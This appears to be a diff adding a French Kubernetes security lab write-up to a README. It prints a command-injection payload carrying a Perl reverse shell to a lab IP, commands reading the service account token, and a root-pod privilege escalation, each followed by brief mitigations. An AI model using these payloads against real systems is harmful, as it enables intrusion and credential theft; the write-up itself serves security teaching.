@@ -65,6 +65,35 @@ Après cette modification, les services sont accessibles et fonctionnent correct
 ![alt text](Screens/ServiceOK.png)
 
 
+# TP Kubernetes Security_2
+on est passé par [reverse shell ](https://www.revshells.com/) pour generer un  reverse shell perl.
+
+```markdown
+google.com; perl -e 'use Socket;$i="10.134.35.160";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
 
 
+On a donc réussi à executer une commande à distance et on est maintenant dans un shell interactif à l'interieur du containeur mais pas en tant que root.        
+
+# Find credentials: 
+- ls /var/run/secrets/kubernetes.io/serviceaccount/
+puis - cat /var/run/secrets/kubernetes.io/serviceaccount/token
+pour afficher le token 
+
+
+Une fois le token recupéré, on télécharge le binaire kubectl et on teste si on peut créer des pods avec ce token : YES 
+![alt text](image.png)
+
+## What could had been done to prevent this issue ?
+- Approche Least Privilege lors de l’affectation des droits
+- Désactiver le montage automatique du token dans les pods
+
+# Escalate your privileges :
+
+On crée un root pod qui utilise le même service account 
+
+![alt text](root-pod.png)
+
+## What could had been done to prevent this issue ?
+Mettre en place des règles qui interdisent la création de pods avec ces paramètres risqués.
 
